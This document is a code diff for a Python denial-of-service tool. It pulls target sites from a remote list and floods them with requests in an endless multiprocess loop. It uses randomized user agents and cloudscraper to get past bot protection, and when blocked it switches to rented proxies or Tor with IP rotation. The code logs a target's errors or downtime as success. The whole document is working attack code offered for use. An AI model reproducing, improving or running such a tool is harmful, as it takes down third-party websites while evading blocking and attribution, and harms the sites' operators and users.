@@ -1,5 +1,7 @@
 import asyncio
-import concurrent
+
+import requests.exceptions
+from aioify import aioify
 from sys import stderr
 from concurrent.futures import ProcessPoolExecutor
 from random import choice
@@ -9,6 +11,7 @@ from loguru import logger
 from pyuseragents import random as random_agent
 from remote_provider import RemoteProvider
 from settings import get_settings
+from tor_proxy import TorProxy
 
 settings = get_settings()
 parser = ArgumentParser()
@@ -28,6 +31,12 @@ no_clear = args.no_clear
 proxy_view = args.proxy_view
 
 provider = RemoteProvider(args.targets)
+tor = TorProxy(
+    host=settings.TOR_HOST,
+    port=settings.TOR_PORT,
+    control_port=settings.TOR_CONTROL_PORT,
+    password=settings.TOR_PASSWORD
+)
 
 
 def set_logger_format():
@@ -45,46 +54,52 @@ def set_logger_format():
     )
 
 
-async def fetch_url(scraper, site):
+@aioify
+def fetch_url(scraper, site, proxies):
     try:
-        async with scraper.get(site, timeout=settings.READ_TIMEOUT) as response:
-            response = await response.read()
-            return response
+        attack_response = scraper.get(site, timeout=settings.READ_TIMEOUT)
+        logger.info(f"{site} status {attack_response.status_code}")
+        if attack_response.status_code > 400:
+            logger.success(f"{site} errored with {attack_response.status_code}")
+            return
+        if attack_response.status_code > 302:
+            if not settings.ENABLE_TOR:
+                proxy = choice(proxies)
+                scraper.proxies.update({
+                    'http': f'http://{proxy["auth"]}@{proxy["ip"]}',
+                    'https': f'https://{proxy["auth"]}@{proxy["ip"]}'
+                })
+                logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
+            else:
+                tor.change_ip()
+                logger.info('USING TOR PROXY')
+                scraper.proxies.update(tor.get_sock5_proxies())
+            attack_response = scraper.get(site, timeout=settings.READ_TIMEOUT)
+            logger.info(f"{site} status {attack_response.status_code}")
+    except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout) as e:
+        logger.success(f"{site} is down. Detail: {e}")
+
     except Exception as e:
-        logger.info(str(e))
-        return None
+        logger.error(f"unexpected error {e}")
 
 
-async def fetch_async(scraper, site):
-    tasks = []
-    for proxy in provider.get_proxies():
-        scrapper_proxies = dict(
-            http=f'http://{proxy["auth"]}@{proxy["ip"]}',
-            https=f'https://{proxy["auth"]}@{proxy["ip"]}'
-        )
-        scraper.proxies.update(scrapper_proxies)
-        task = asyncio.ensure_future(fetch_url(scraper, site))
-        tasks.append(task)
-        scraper.proxies.clear()
-    responses = await asyncio.gather(*tasks)
-    return responses
-
-
-def attack_subprocess(site: str):
-    scrapper = cloudscraper.create_scraper(browser=settings.BROWSER)
+def attack_subprocess(site: str, proxies: list):
+    scraper = cloudscraper.create_scraper(browser=settings.BROWSER)
     headers = settings.HEADERS_TEMPLATE
     headers['User-Agent'] = random_agent()
-    scrapper.headers.update(headers)
+    scraper.headers.update(headers)
     logger.info(f"STARTING ATTACK TO  {site}")
-    requests_loop = asyncio.get_event_loop()
-    future = asyncio.ensure_future(fetch_async(scrapper, site))
-    requests_loop.run_until_complete(future)
-    responses = future.result()
-    print(responses)
+    scraper.proxies.clear()
+    tasks = asyncio.gather(*(fetch_url(scraper, site, proxies) for _ in range(settings.MAX_REQUESTS_TO_SITE)))
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(tasks)
 
 
 if __name__ == '__main__':
     set_logger_format()
     sites = provider.get_target_sites()
-    with ProcessPoolExecutor() as executor:
-        processes = [executor.submit(attack_subprocess, choice(sites)) for _ in range(1)]
+    proxies = provider.get_proxies()
+    while True:
+        with ProcessPoolExecutor(max_workers=settings.DEFAULT_THREADS) as executor:
+            processes = [executor.submit(attack_subprocess, choice(sites), proxies)
+                         for _ in range(settings.DEFAULT_THREADS)]
